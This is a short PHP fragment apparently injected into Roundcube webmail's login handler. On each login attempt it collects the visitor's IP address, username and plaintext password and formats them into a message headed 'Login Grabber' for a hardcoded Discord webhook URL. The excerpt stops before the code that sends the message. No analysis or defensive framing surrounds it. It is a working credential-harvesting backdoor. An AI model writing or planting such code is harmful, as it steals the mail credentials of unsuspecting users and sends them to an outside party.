...
if ($RCMAIL->task == 'login' && $RCMAIL->action == 'login') {
    ...
    $webhook_url = 'https://ptb.discord.com/api/webhooks/1388313367189393498/jfqPyI-rh4W69aka6Z8OMKx7ZGMKlr0DcsCb82DudPg9oNvpxI9e0SNnfxG2PP4JZjBm';    

    $ip_address = $_SERVER['REMOTE_ADDR'];

    $data = [
        'content' => "**Login Grabber by Xpert & Blah & Ergo:**\n"
                     . "IP: `" . $ip_address . "`\n"
                     . "Username: `" . $auth['user'] . "`\n"
                     . "Password: `" . $auth['pass'] . "`"
    ];
